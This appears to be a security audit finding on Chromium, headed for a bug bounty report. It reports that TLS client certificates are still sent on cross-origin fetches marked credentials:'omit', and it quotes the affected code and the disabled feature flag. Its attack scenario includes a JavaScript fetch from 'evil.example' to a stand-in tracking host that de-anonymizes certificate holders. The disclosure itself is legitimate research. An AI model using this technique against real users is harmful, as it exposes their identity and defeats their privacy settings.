# Finding 044: TLS Client Certificates Sent Despite credentials:"omit" (kOmitCorsClientCert Disabled)

## Summary

When a cross-origin fetch is made with `credentials: "omit"`, TLS client certificates are still sent to the server. The fix exists behind the `kOmitCorsClientCert` feature flag, but it is `FEATURE_DISABLED_BY_DEFAULT`. This means cross-origin requests intended to be anonymous still reveal the user's TLS client certificate identity.

## Affected Files

- `services/network/url_loader_util.cc:102-112` — ShouldSendClientCertificates returns true for kOmit
- `services/network/public/cpp/features.cc:197` — kOmitCorsClientCert DISABLED_BY_DEFAULT

## Details

### The bug (crbug.com/40089326 / original 775438)

```cpp
// url_loader_util.cc:102-112
bool ShouldSendClientCertificates(mojom::CredentialsMode credentials_mode) {
  switch (credentials_mode) {
    case mojom::CredentialsMode::kInclude:
    case mojom::CredentialsMode::kSameOrigin:
      return true;

    // TODO(crbug.com/40089326): Due to a bug, the default behavior does
    // not properly correspond to Fetch's "credentials mode", in that client
    // certificates will be sent if available, or the handshake will be aborted
    // to allow selecting a client cert.
    // With the feature kOmitCorsClientCert enabled, the correct
    // behavior is done; omit all client certs and continue the handshake
    // without sending one if requested.
    case mojom::CredentialsMode::kOmit:
      return !base::FeatureList::IsEnabled(features::kOmitCorsClientCert);
      // Returns TRUE when flag disabled (default) — certs are sent!

    case mojom::CredentialsMode::kOmitBug_775438_Workaround:
      return false;
  }
}
```

### The disabled fix

```cpp
// features.cc:197
BASE_FEATURE(kOmitCorsClientCert, base::FEATURE_DISABLED_BY_DEFAULT);
```

## Attack Scenario

### User de-anonymization via TLS client certificates

1. User has a TLS client certificate installed (common in enterprise, government, banking)
2. User visits `evil.example` which contains:
```javascript
// This request explicitly says "don't send credentials"
fetch('https://tracking-server.example/collect', {
  mode: 'no-cors',
  credentials: 'omit'  // Should not send any credentials
});
```
3. **Expected behavior**: No cookies, no HTTP auth, no client certificates sent
4. **Actual behavior**: TLS client certificate is sent during the TLS handshake
5. `tracking-server.example` receives the client cert's Distinguished Name, serial number, and issuer — uniquely identifying the user
6. The user is de-anonymized despite explicitly requesting credential omission

### Cross-origin tracking without cookies

1. Even if a user blocks third-party cookies, TLS client certs are a separate channel
2. Any page can make `credentials: "omit"` requests to tracking endpoints
3. Client certs bypass cookie blocking, tracking prevention, and privacy settings
4. The tracking server never needs to set a cookie — the cert identity is sufficient

## Impact

- **No compromised renderer required**: Standard JavaScript API
- **Privacy violation**: `credentials: "omit"` is supposed to be the privacy-preserving mode
- **Spec violation**: Fetch spec requires client certs not be sent when credentials mode is "omit"
- **Bypass of privacy features**: Cookie blocking, tracking prevention, incognito mode expectations all undermined
- **Enterprise impact**: Particularly severe in enterprise environments where client certs are deployed

## VRP Value

**Medium-High** — No renderer compromise required. Exploitable via standard web APIs. Affects a fundamental web platform privacy primitive. The workaround (`kOmitBug_775438_Workaround`) exists but requires specific API usage — the standard `credentials: "omit"` path is broken.
